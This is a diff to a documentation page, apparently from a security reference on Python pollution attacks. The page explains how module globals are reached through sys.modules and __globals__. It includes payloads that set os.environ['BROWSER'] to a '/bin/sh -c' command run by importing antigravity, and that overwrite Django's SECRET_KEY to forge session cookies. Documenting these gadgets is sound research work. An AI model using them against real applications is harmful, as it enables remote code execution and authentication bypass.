@@ -3,74 +3,67 @@ title: "Modules"
 weight: 2
 ---
 
-# Module Pollution Target
+# Modules
 
-When a module `mod` is accessible, the attacker controls global variables used across modules. Module-level pollution is powerful because global variables are shared by all code that imports from that module.
+When a module `mod` is accessible, the attacker can modify any of its module-level globals. Module pollution is powerful because module globals are shared across every importer.
 
-## Access Mechanism: Global Variable Reference
+## Access mechanism: global variable reference
 
-Python modules use a global namespace (a dictionary) to store module-level variables. When code does `from mod import v` or `mod.v`, it reads from this namespace.
+A Python module's global namespace is a dictionary on the module object. Reads such as `from mod import v` or `mod.v` resolve to entries in that dictionary, so writing to `mod.__dict__["v"]` or `mod.v` changes what every importer sees.
 
 ```python
 # mod.py
 def f():
     global v
-    v = "safe"
+    v               # attacker controls the global variable
 
 # other.py
-from mod import v   # Reads mod.__dict__['v']
-print(v)            # → "safe"
+from mod import v   # reads mod.__dict__["v"]
+v                   # the polluted value is used here
 ```
 
-## Loading Context
+## How to reach a module
 
-```python
-# mod.py
-def f(): global v; v    # Attacker controls the global variable
-# other.py
-from mod import v; v    # Used across modules
-```
+Modules are accessible through three routes.
 
-## How to Reach Modules
-
-Modules are accessible through:
-
-1. **`sys.modules`** — The global module cache containing all loaded modules
-2. **`f.__globals__`** — Any function carries a reference to its defining module's `__dict__`
-3. **Direct attribute access** — If the module object is reachable via traversal
+1. **`sys.modules`**. The global module cache contains every loaded module by name. Reaching `sys.modules` once means reaching `os`, `subprocess`, `django.conf`, and anything else the application has imported.
+2. **`f.__globals__`**. Every function carries a reference to its defining module's `__dict__`. Any traversal that passes through a function reaches that function's module globals (covered on the [Functions]({{< relref "functions" >}}) page).
+3. **Direct attribute access**. If the attacker's traversal already holds the module object as a value, attribute access on it lands directly in the module's globals.
 
 ```python
 # Reaching sys.modules from any object:
-obj.__class__.__init__.__globals__['sys'].modules
+obj.__class__.__init__.__globals__["sys"].modules
 
-# Or via __globals__ directly:
-obj.__class__.__init__.__globals__  # → module's namespace
+# Or stepping into a single module's globals via any of its functions:
+obj.__class__.__init__.__globals__   # the defining module's namespace
 ```
 
-## Example: Polluting Environment Variables
+### Example: polluting `os.environ` for RCE
 
 ```python
-# Traversal to os.environ:
-# __class__.__init__.__globals__.sys.modules.os.environ
-
 import os
-# After pollution: os.environ["BROWSER"] = "/bin/sh -c 'malicious command'"
-import antigravity  # Triggers webbrowser → reads BROWSER → RCE
+import webbrowser
+
+os.environ.get("BROWSER")           # returns whatever the user set, e.g. "firefox"
+
+# Attacker payload (Item-Set on os.environ via __class__.__init__.__globals__):
+#   os.environ["BROWSER"] = "/bin/sh -c 'id > /tmp/pwned'"
+
+import antigravity                  # calls webbrowser.open(), which now executes the shell command
 ```
 
-## Example: Polluting Django Settings
+### Example: polluting `django.conf.settings.SECRET_KEY` for auth bypass
 
 ```python
-# Traversal to Django's SECRET_KEY:
-# __init__.__globals__.sys.modules.django.conf.settings.SECRET_KEY
+from django.conf import settings
+from django.core.signing import Signer
 
-# After pollution: SECRET_KEY = "attacker_known_value"
-# → Attacker can forge session cookies → authentication bypass
+Signer().sign("payload")            # signs with the real, unknown SECRET_KEY
+
+# Attacker payload (Attr-Set on settings via __init__.__globals__["sys"].modules["django.conf"]):
+#   settings.SECRET_KEY = "attacker_known_value"
+
+Signer().sign("payload")            # signs with the attacker's known key, so the attacker can forge cookies
 ```
 
-## Why Module Pollution Is Powerful
-
-1. **Global scope**: Module variables are shared across the entire application
-2. **Cross-module impact**: Polluting one module affects all importers
-3. **Standard library**: Critical modules like `os`, `sys`, `subprocess` are always loaded
-4. **No instance required**: Unlike class pollution, module pollution doesn't need multiple instances
+Both patterns are detailed on the [RCE gadgets]({{< relref "/docs/gadgets/rce" >}}) and [authentication bypass gadgets]({{< relref "/docs/gadgets/auth-bypass" >}}) pages.
